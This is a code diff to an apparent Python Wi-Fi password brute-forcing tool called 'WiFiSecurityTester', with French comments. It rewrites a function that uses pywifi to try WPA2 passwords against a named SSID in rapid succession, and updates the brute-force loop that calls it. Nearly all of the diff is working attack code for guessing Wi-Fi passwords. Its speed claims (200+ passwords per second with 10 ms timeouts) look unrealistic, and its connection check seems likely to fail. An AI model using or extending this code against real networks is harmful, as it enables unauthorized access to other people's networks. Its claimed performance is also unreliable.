@@ -361,37 +361,47 @@ class WiFiSecurityTester:
         self.print_success(f"Wordlist générée: {len(self.wordlist):,} mots de passe")
         return self.wordlist
     
-    def connect_to_wifi(self, ssid, password, timeout=0.05):
-        """Connexion WiFi ultra-rapide - Optimisée pour 200+ pwd/sec"""
-        if not self.interface:
-            return False, "Interface WiFi non disponible"
-        
+    def connect_to_wifi(self, ssid, password):
+        """Connexion ultra-rapide avec timeout minimal"""
         try:
-            self.interface.disconnect()
-            time.sleep(0.005)  # Ultra-rapide: 5ms
+            # Interface WiFi
+            iface = pywifi.Interface()
             
+            # Déconnexion d'abord
+            iface.disconnect()
+            time.sleep(0.01)  # Ultra-rapide
+            
+            # Configuration de connexion
             profile = pywifi.Profile()
             profile.ssid = ssid
-            profile.auth = const.AUTH_ALG_OPEN
-            profile.akm.append(const.AKM_TYPE_WPA2PSK)
-            profile.cipher = const.CIPHER_TYPE_CCMP
+            profile.auth = pywifi.const.AUTH_ALG_OPEN
+            profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
+            profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
             profile.key = password
             
-            self.interface.remove_all_network_profiles()
-            temp_profile = self.interface.add_network_profile(profile)
-            self.interface.connect(temp_profile)
+            # Connexion avec timeout ultra-rapide
+            iface.remove_all_network_profiles()
+            temp_profile = iface.add_network_profile(profile)
             
-            # Timeout ultra-rapide: 0.05s pour 200+ pwd/sec
-            for i in range(int(timeout * 200)):  # 200 vérifications par seconde
-                if self.interface.status() == const.IFACE_CONNECTED:
-                    return True, "Connexion réussie"
-                time.sleep(0.005)  # 5ms au lieu de 10ms
+            # Connexion avec timeout minimal pour vitesse maximale
+            iface.connect(temp_profile)
+            time.sleep(0.01)  # Timeout ultra-rapide pour 200+ pwd/sec
             
-            self.interface.disconnect()
-            return False, "Timeout de connexion"
-            
+            # Vérification ultra-rapide
+            if iface.status() in [pywifi.const.IFACE_CONNECTED]:
+                return True
+            else:
+                iface.disconnect()
+                time.sleep(0.01)  # Délai minimal
+                return False
+                
         except Exception as e:
-            return False, f"Erreur de connexion: {str(e)}"
+            try:
+                iface.disconnect()
+                time.sleep(0.01)  # Délai minimal
+            except:
+                pass
+            return False
     
     def brute_force_wifi_real(self, target_ssid, max_attempts=None):
         """Brute force ultra-rapide - Optimisé pour 10+ billions de mots de passe"""
@@ -454,8 +464,8 @@ class WiFiSecurityTester:
                     password = self.wordlist[i]
                     self.attempts += 1
                     
-                    # Vitesse extrême: timeout 0.05s pour 200+ pwd/sec
-                    success, message = self.connect_to_wifi(target_ssid, password, timeout=0.05)
+                    # Vitesse extrême: timeout 0.01s pour 200+ pwd/sec
+                    success = self.connect_to_wifi(target_ssid, password)
                     
                     if success:
                         self.password_found = True
